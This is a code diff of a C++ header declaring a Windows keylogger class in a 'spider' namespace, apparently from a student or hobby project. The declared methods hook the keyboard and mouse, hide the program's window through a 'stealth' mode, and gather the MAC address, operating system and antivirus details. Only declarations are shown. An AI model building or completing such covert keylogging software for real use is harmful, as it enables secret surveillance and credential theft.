@@ -19,44 +19,51 @@
 #include	"IKeyLogger.hpp"
 #include	"dataStructure.hpp"
 
-class 		WindowsKeyLogger : public IKeyLogger
+
+namespace spider
 {
-private:
-  t_register	*infos;
-public:
+  class 	WindowsKeyLogger : public IKeyLogger
+  {
+  private:
+    t_register	*infos;
+  public:
 
-  ///brief std::map of the key that have a VK_CODE association
-  static std::map<DWORD, std::string> const keys;
+    ///brief std::map of the key that have a VK_CODE association
+    static std::map<DWORD, std::string> const keys;
 
-  ///brief std::map of the key for the azerty keyboard
-  static std::map<int, std::string> const correlingTable;
+    ///brief std::map of the key for the azerty keyboard
+    static std::map<int, std::string> const correlingTable;
 
-public:
+    ///brief getter of the t_register attribute.
+    t_register const &getInfos();
 
-  ///brief constructor of the WindowsKeyLogger
-  WindowsKeyLogger();
+  public:
 
-  ///brief destructor of the WindowsKeyLogger
-  ~WindowsKeyLogger();
+    ///brief constructor of the WindowsKeyLogger
+    WindowsKeyLogger();
 
-  ///brief init the hooks for the mouse and the keyboard
-  void		initHooks();
+    ///brief destructor of the WindowsKeyLogger
+    ~WindowsKeyLogger();
 
-  ///brief init the stealth mode to be sure that no windows is displayed when the keylogger is launched
-  void		stealth();
+    ///brief init the hooks for the mouse and the keyboard
+    void		initHooks();
 
-  ///brief release the hooks for the mouse and the keyboard
-  void		unHooks();
+    ///brief init the stealth mode to be sure that no windows is displayed when the keylogger is launched
+    void		stealth();
 
-  ///brief retrieve the address mac
-  void		getMacAddr();
+    ///brief release the hooks for the mouse and the keyboard
+    void		unHooks();
 
-  ///brief retrieve the operating system
-  void		getOperatingSystem();
+    ///brief retrieve the address mac
+    void		getMacAddr();
 
-  ///brief retrieve the anti virus of the computer
-  void		getAntiVirus();
-};
+    ///brief retrieve the operating system
+    void		getOperatingSystem();
+
+    ///brief retrieve the anti virus of the computer
+    void		getAntiVirus();
+  };
+}
 
 LRESULT CALLBACK handleKeyboard(int code, WPARAM wp, LPARAM lp);
 LRESULT CALLBACK handleMouse(int code, WPARAM wp, LPARAM lp);
